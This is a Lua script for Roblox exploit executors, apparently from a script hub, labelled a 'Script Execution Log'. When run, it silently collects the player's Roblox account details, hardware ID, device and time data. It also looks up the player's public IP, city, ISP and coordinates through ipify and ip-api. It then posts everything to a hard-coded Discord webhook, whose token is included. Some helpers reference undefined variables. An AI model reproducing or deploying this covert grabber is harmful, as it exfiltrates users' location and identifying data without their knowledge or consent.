local HttpService = game:GetService("HttpService")
local UserInputService = game:GetService("UserInputService")
local RbxAnalyticsService = game:GetService("RbxAnalyticsService")
local Players = game:GetService("Players")
local TeleportService = game:GetService("TeleportService")
local RunService = game:GetService("RunService")

local WEBHOOK = "https://discord.com/api/webhooks/1432775054533460120/q2qLyFlynzBPZk8144DMZ0GZMfu5cMtab07bC6eED4P2eexF1SwvZU0hbsNaWp0aK4Cq"
local WEBHOOK_NAME = "rbxscript"
local AVATAR_LINK = "https://cdn.discordapp.com/attachments/1003114123049054218/1431006429342339213/32.png?ex=6901c6d7&is=69007557&hm=257c1f7f10ec19e079edf8c4ae521df3725f9543cc9c7ce9ffab281165531143&"
local ICON_URL = "https://cdn.discordapp.com/attachments/1003114123049054218/1431006429342339213/32.png?ex=6901c6d7&is=69007557&hm=257c1f7f10ec19e079edf8c4ae521df3725f9543cc9c7ce9ffab281165531143&"
local ROBLOX_SERVER_ID = "https://www.roblox.com/games/%d?serverId=%s"
local ROBLOX_GAMES = "https://www.roblox.com/games/%d/"
local ROBLOX_PROFILES = "https://www.roblox.com/users/%d/profile"
local API_IP_ORG = "https://api.ipify.org"
local API_IP_JSON = "http://ip-api.com/json/"

local function getExecutor()
    return (identifyexecutor and identifyexecutor()) or 
           (getexecutorname and getexecutorname()) or 
           (syn and "Synapse X") or
           (KRNL_LOADED and "Krnl") or
           (fluxus and "Fluxus") or
           (PROTO_COMMAND_LOADED and "ProtoSmasher") or
           "Unknown"
end

local function generateRandomId(length)
    local chars = "abcdefghijklmnopqrstuvwxyz0123456789"
    local randomId = ""
    for i = 1, length do
        local rand = math.random(1, #chars)
        randomId = randomId .. chars:sub(rand, rand)
    end
    return randomId
end

local function getUserIdFromStats()
    local statsFile = "Space-Hub/Stats/Id.json"
    
    if not isfile or not isfile(statsFile) then
        return generateRandomId(32)
    end
    
    local success, result = pcall(function()
        local fileContent = readfile(statsFile)
        if fileContent and fileContent ~= "" then
            local data = HttpService:JSONDecode(fileContent)
            return data.id or generateRandomId(32)
        else
            return generateRandomId(32)
        end
    end)
    
    if success then
        return result or generateRandomId(32)
    else
        return generateRandomId(32)
    end
end

local userId = getUserIdFromStats()

local function getGameInfo()
    local placeId = game.PlaceId
    local jobId = game.JobId
    local gameName = "Unknown"
    local creator = "Unknown"
    
    local success, result = pcall(function()
        local marketPlaceService = game:GetService("MarketplaceService")
        local gameInfo = marketPlaceService:GetProductInfo(placeId)
        gameName = gameInfo.Name or "Unknown"
        creator = gameInfo.Creator.Name or "Unknown"
    end)
    
    return {
        placeId = placeId,
        jobId = jobId,
        name = gameName,
        creator = creator
    }
end

local function getPlayerInfo()
    local player = Players.LocalPlayer
    if not player then return {} end
    
    local character = player.Character
    local humanoid = character and character:FindFirstChildOfClass("Humanoid")
    
    return {
        displayName = player.DisplayName,
        username = player.Name,
        userId = player.UserId,
        accountAge = player.AccountAge,
        membership = player.MembershipType == Enum.MembershipType.Premium and "Premium" or "Regular",
        health = humanoid and math.floor(humanoid.Health) or 0,
        maxHealth = humanoid and math.floor(humanoid.MaxHealth) or 0,
        team = player.Team and player.Team.Name or "No Team"
    }
end

local function getSystemInfo()
    local deviceType = UserInputService.TouchEnabled and "Mobile" or "PC"
    local platform = UserInputService:GetPlatform().Name
    local hwid = RbxAnalyticsService:GetClientId() or "Unknown"
    local executor = getExecutor()
    
    local localTime = os.date("*t")
    local utcTime = os.date("!*t")
    local timezone = os.difftime(os.time(localTime), os.time(utcTime)) / 3600
    local timezoneStr = string.format("UTC%+d", timezone)
    
    return {
        deviceType = deviceType,
        platform = platform,
        hwid = hwid,
        executor = executor,
        localTime = string.format("%02d:%02d:%02d", localTime.hour, localTime.min, localTime.sec),
        timezone = timezoneStr,
        fps = RunService:IsRunning() and math.floor(1/RunService.RenderStepped:Wait()) or 0
    }
end

local function getNetworkInfo()
    local playerIp = "Unknown"
    local countryName = "Unknown"
    local region = "Unknown"
    local city = "Unknown"
    local isp = "Unknown"
    local lat = "Unknown"
    local lon = "Unknown"
    
    local httpGet = syn and syn.request or http and http.request or request or http_request
    if not httpGet then return {} end
    
    local ipSuccess, ipResult = pcall(function()
        local ipResponse = httpGet({
            Url = API_IP_ORG, 
            Method = "GET",
            Timeout = 10
        })
        
        if ipResponse and (ipResponse.Success or ipResponse.StatusCode == 200) then
            playerIp = ipResponse.Body or "Unknown"
            
            local geoResponse = httpGet({
                Url = API_IP_JSON .. playerIp, 
                Method = "GET",
                Timeout = 10
            })
            
            if geoResponse and (geoResponse.Success or geoResponse.StatusCode == 200) then
                local geoData = HttpService:JSONDecode(geoResponse.Body)
                countryName = geoData.country or "Unknown"
                region = geoData.regionName or "Unknown"
                city = geoData.city or "Unknown"
                isp = geoData.isp or "Unknown"
                lat = geoData.lat or "Unknown"
                lon = geoData.lon or "Unknown"
            end
        end
    end)
    
    if not ipSuccess then

    end
    
    return {
        ip = playerIp,
        country = countryName,
        region = region,
        city = city,
        isp = isp,
        coordinates = string.format("%s, %s", lat, lon)
    }
end

local function getPlayerThumbnail(userId, thumbnailType, thumbnailSize)
    thumbnailType = thumbnailType or Enum.ThumbnailType.HeadShot
    thumbnailSize = thumbnailSize or Enum.ThumbnailSize.Size420x420

    local cached = thumbnailCache[userId]
    if cached and (os.time() - (cached.ts or 0) < CACHE_TTL) then
        return cached.url
    end

    local ok, result1, result2 = pcall(function()
        return Players:GetUserThumbnailAsync(userId, thumbnailType, thumbnailSize)
    end)

    if not ok then
        return nil
    end

    local imageUrl = result1
    if type(imageUrl) == "string" and imageUrl ~= "" then
        thumbnailCache[userId] = { url = imageUrl, ts = os.time() }
        return imageUrl
    end

    return nil
end

local function sendWebhook()
    local success, result = pcall(function()
        local gameInfo = getGameInfo()
        local playerInfo = getPlayerInfo()
        local systemInfo = getSystemInfo()
        local networkInfo = getNetworkInfo()
        
        local playerProfileUrl = string.format(ROBLOX_PROFILES, playerInfo.userId)
        local gameUrl = string.format(ROBLOX_GAMES, gameInfo.placeId)
        local serverLink = gameInfo.jobId ~= "Unknown" and 
            string.format(ROBLOX_SERVER_ID, gameInfo.placeId, gameInfo.jobId) or 
            "No server link available"

        local Embed = {
            title = "🛠️ Script Execution Log",
            color = 0x00FF88,
            footer = { 
                text = string.format("Tracking ID: %s | Executor: %s", userId, systemInfo.executor),
                icon_url = ICON_URL
            },
            thumbnail = {
                url = string.format("", playerInfo.userId)
            },
            fields = {
                { name = "🔻 User Information", value = "▬▬▬▬▬▬▬▬▬▬▬▬▬▬", inline = false },
				
				{ 
                    name = "👤 Player Information", 
                    value = string.format("**Profile:** [Link](%s)\n**User ID:** `%d`\n**Display Name:** `%s`\n**Username:** `%s`\n**Account Age:** `%d days`\n**Membership:** `%s`", 
                        playerProfileUrl, playerInfo.userId, playerInfo.displayName, playerInfo.username, 
                        playerInfo.accountAge, playerInfo.membership), 
                    inline = true 
                },
                
                { 
                    name = "🎯 In-Game Status", 
                    value = string.format("**Health:** `%d/%d`\n**Team:** `%s`", 
                        playerInfo.health, playerInfo.maxHealth, playerInfo.team), 
                    inline = true 
                },
                
                { 
                    name = "🎮 Game Information", 
                    value = string.format("**Game:** [%s](%s)\n**Creator:** `%s`\n**Place ID:** `%d`", 
                        gameInfo.name, gameUrl, gameInfo.creator, gameInfo.placeId), 
                    inline = true 
                },
                
				{ name = "🔻 Server Information", value = "▬▬▬▬▬▬▬▬▬▬▬▬▬▬", inline = false },

                { 
                    name = "🌍 Server Details", 
                    value = string.format("**Server:** [Join Server](%s)\n**Job ID:** `%s`", 
                        serverLink, gameInfo.jobId), 
                    inline = true 
                },

				{ 
                    name = "📊 Additional Info", 
                    value = string.format("**Players in Game:** `%d/%d`\n**Tracking ID:** `%s`", 
                        #Players:GetPlayers(), Players.MaxPlayers, userId), 
                    inline = true 
                },
                
                { name = "🔻 Network & Location", value = "▬▬▬▬▬▬▬▬▬▬▬▬▬▬", inline = false },
                
                { 
                    name = "🌐 Network Information", 
                    value = string.format("**IP:** `%s`\n**ISP:** `%s`", 
                        networkInfo.ip, networkInfo.isp), 
                    inline = true 
                },
                
                { 
                    name = "📍 Geolocation", 
                    value = string.format("**Country:** `%s`\n**Region:** `%s`\n**City:** `%s`\n**Coordinates:** `%s`", 
                        networkInfo.country, networkInfo.region, networkInfo.city, networkInfo.coordinates), 
                    inline = true 
                },
                
                { name = "🔻 System Information", value = "▬▬▬▬▬▬▬▬▬▬▬▬▬▬", inline = false },
                
                { 
                    name = "💻 Client Information", 
                    value = string.format("**Device:** `%s`\n**Platform:** `%s`\n**Executor:** `%s`\n**FPS:** `%d`", 
                        systemInfo.deviceType, systemInfo.platform, systemInfo.executor, systemInfo.fps), 
                    inline = true 
                },
                
                { 
                    name = "🔑 Hardware & Time", 
                    value = string.format("**HWID:** `%s`\n**Local Time:** `%s`\n**Timezone:** `%s`", 
                        systemInfo.hwid, systemInfo.localTime, systemInfo.timezone), 
                    inline = true 
                }
            },
            timestamp = os.date('!%Y-%m-%dT%H:%M:%SZ'),
        }

        local httpRequest = syn and syn.request or http and http.request or request or http_request
        if not httpRequest then
            return false
        end

        local requestData = {
            Url = WEBHOOK,
            Method = "POST",
            Headers = { 
                ["Content-Type"] = "application/json",
                ["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
            },
            Body = HttpService:JSONEncode({
                username = WEBHOOK_NAME,
                avatar_url = AVATAR_LINK,
                content = string.format("", 
                    playerInfo.displayName, playerInfo.username, gameInfo.name, systemInfo.executor, userId),
                embeds = { Embed }
            })
        }

        local requestSuccess, response = pcall(httpRequest, requestData)
        if not requestSuccess then
            return false
        end

        if response and (response.StatusCode ~= 200 and response.StatusCode ~= 204) then
            return false
        end

        return true
    end)

    if not success then
        return false
    end

    return true
end

sendWebhook()
